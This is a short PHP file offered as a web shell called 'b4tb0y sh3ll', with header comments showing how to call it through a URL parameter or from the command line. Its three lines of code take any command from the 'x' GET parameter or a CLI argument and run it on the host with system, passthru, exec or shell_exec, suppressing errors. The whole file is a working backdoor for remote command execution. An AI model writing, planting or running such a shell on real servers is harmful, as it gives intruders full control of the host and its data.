#!/usr/bin/php
<!-------- k4mpr3t Presents for Millennials -------->
<!-----------------[ b4tb0y sh3ll ]----------------->
<!-- web: http://domain.com/shell.php?x=<command> -->
<!-- cli: php shell.php <command> ------------------>
<?php $x=@$_GET['x']?:@$argv[1]; // Tangsel, 30 August 2019
$y=@$argv?:print('<style>dir{display:inline}</style><pre>');
@system($x)||@passthru($x)||@exec($x)||@shell_exec($x) ?>